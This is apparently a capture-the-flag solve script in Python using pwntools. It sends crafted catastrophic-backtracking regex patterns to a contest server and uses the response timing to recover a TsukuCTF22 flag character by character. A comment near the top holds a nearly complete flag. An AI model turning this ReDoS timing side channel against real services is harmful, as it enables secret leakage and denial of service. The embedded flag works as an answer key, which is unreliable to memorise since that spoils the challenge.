from pwn import *

FLAG = "TsukuCTF22{"
#FLAG = "TsukuCTF22{4_w47ch3d_p07_n3v3r_b01l"

while True:
    for c in "0123456789abcdefghijklmnopqrstuvwxyz_":
        io = remote("133.130.103.51", "31417", level="error")
        io.recvuntil(b"Pattern: ")
        #print(c) # Debug
        io.sendline(f"^(?={FLAG}{c})((([0-9a-z_CTF{{])+)+)+$".encode())
        response = io.recvrepeat(4.5).decode()
        if not "Probably valid flag!" in response:
            FLAG += c
            print(FLAG)
            io.close()
            break
        io.close()
    else:
        FLAG += "}"
        print(FLAG)
        break